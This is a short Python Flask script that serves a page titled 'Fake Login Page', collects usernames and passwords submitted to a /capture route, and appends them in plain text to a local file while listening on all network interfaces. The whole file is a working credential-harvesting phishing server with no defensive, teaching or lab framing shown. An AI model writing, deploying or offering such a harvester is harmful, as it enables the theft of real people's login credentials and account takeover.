from flask import Flask, request

app = Flask(__name__)

# Serve the fake login page
@app.route("/")
def login_page():
    # HTML code embedded directly into the Python script
    return """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Fake Login Page</title>
    </head>
    <body>
        <h2>Login</h2>
        <form action="/capture" method="post">
            <label for="username">Username:</label>
            <input type="text" id="username" name="username" required><br><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required><br><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    """

# Capture and store credentials
@app.route("/capture", methods=["POST"])
def capture_credentials():
    username = request.form.get("username")
    password = request.form.get("password")
    
    # Save captured credentials to a file
    with open("captured_credentials.txt", "a") as file:
        file.write(f"Username: {username}, Password: {password}\n")
    
    return "Credentials captured. Thank you!"  # Fake response

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
